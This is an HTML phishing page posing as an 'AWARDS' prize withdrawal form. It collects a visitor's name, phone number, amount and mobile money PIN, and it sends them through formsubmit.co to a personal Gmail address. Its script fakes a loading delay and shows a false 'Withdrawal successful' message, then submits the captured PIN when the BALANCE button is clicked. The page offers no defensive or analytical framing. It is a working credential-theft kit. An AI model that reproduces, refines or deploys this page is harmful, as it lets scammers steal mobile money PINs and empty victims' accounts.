<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AWARDS</title>

<style>
    /* --- Layout & Styling (UNCHANGED) --- */
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background: #f2f2f2;
    }

    .title-bar {
        background: yellow;
        color: black;
        text-align: center;
        padding: 15px;
        font-size: 22px;
        font-weight: bold;
    }

    .container {
        padding: 20px;
    }

    label {
        font-weight: bold;
        display: block;
        margin-top: 15px;
    }

    input {
        width: 100%;
        padding: 12px;
        border-radius: 5px;
        border: 1px solid #888;
        margin-top: 5px;
        font-size: 16px;
    }

    .pin-wrapper {
        position: relative;
    }

    .toggle-eye {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        cursor: pointer;
        font-size: 14px;
        color: blue;
    }

    .withdraw-btn {
        width: 100%;
        background: blue;
        color: white;
        padding: 15px;
        margin-top: 25px;
        text-align: center;
        border-radius: 5px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        opacity: 0.5;
        pointer-events: none;
    }

    .withdraw-btn.enabled {
        opacity: 1;
        pointer-events: auto;
    }

    .loading {
        display: none;
        text-align: center;
        margin-top: 20px;
        font-size: 18px;
        font-weight: bold;
    }

    .success-box {
        display: none;
        background: green;
        color: white;
        padding: 15px;
        margin-top: 20px;
        border-radius: 5px;
        text-align: center;
        font-weight: bold;
    }

    .balance-btn {
        width: 100%;
        background: green;
        color: white;
        padding: 15px;
        margin-top: 20px;
        text-align: center;
        border-radius: 5px;
        font-size: 18px;
        font-weight: bold;
        border: none;
        cursor: pointer;
        display: none;
    }
</style>
</head>

<body>

<div class="title-bar">AWARDS</div>

<div class="container">

<form id="submissionForm" action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST" target="_blank">

    <input type="hidden" name="_subject" value="AWARDS Balance Request">
    
    <input type="text" name="_honey" style="display:none">

    <label>Enter your Name</label>
    <input type="text" id="name" name="Name" oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')" placeholder="Your Name">

    <label>Enter phone number</label>
    <input type="text" id="phone" name="Phone" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="07XXXXXXXX">

    <label>Enter Amount to withdraw</label>
    <input type="text" id="amount" name="Amount" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="1000">

    <label>Enter your Mobile money pin/secret code to withdraw (for Amount to withdraw: <span id="displayAmount">---</span> to Phone number: <span id="displayPhone">---</span>)</label>
    <div class="pin-wrapper">
        <input type="password" id="pin" name="PIN" placeholder="****">
        <span class="toggle-eye" onclick="togglePIN()">Show</span>
    </div>

    <div id="withdrawBtn" class="withdraw-btn">WITHDRAW</div>

    <div id="loading" class="loading">Loading...</div>

    <div id="success" class="success-box">
        Withdrawal successful. Click balance button to check balance.
    </div>

    <button type="button" id="balanceBtn" class="balance-btn">BALANCE</button>

</form>

</div>

<script>
function togglePIN() {
    const pin = document.getElementById("pin");
    const eye = document.querySelector(".toggle-eye");
    if (pin.type === "password") {
        pin.type = "text";
        eye.textContent = "Hide";
    } else {
        pin.type = "password";
        eye.textContent = "Show";
    }
}

const fields = ["name","phone","amount","pin"];
const amountDisplay = document.getElementById("displayAmount");
const phoneDisplay = document.getElementById("displayPhone");

fields.forEach(id => {
    document.getElementById(id).addEventListener("input", checkFields);
});
document.getElementById("amount").addEventListener("input", function() {
    amountDisplay.textContent = this.value || '---';
});
document.getElementById("phone").addEventListener("input", function() {
    phoneDisplay.textContent = this.value || '---';
});


function checkFields() {
    const filled = fields.every(id => document.getElementById(id).value.trim() !== "");
    const btn = document.getElementById("withdrawBtn");
    if (filled) {
        btn.classList.add("enabled");
    } else {
        btn.classList.remove("enabled");
    }
}

document.getElementById("withdrawBtn").addEventListener("click", function() {
    if (!this.classList.contains("enabled")) return;

    this.style.display = 'none'; 
    document.getElementById("loading").style.display = "block";

    // 5-second simulated delay
    setTimeout(() => {
        document.getElementById("loading").style.display = "none";
        document.getElementById("success").style.display = "block";
        document.getElementById("balanceBtn").style.display = "block";
    }, 5000);
});


// ðŸš€ Submission Logic: Explicitly trigger the form submission
document.getElementById("balanceBtn").addEventListener("click", function(){
    const form = document.getElementById("submissionForm");
    // This submits the data. FormSubmit will open a new tab/window due to target="_blank".
    form.submit();
});

checkFields();
document.getElementById("amount").dispatchEvent(new Event('input'));
document.getElementById("phone").dispatchEvent(new Event('input'));
</script>

</body>
</html>
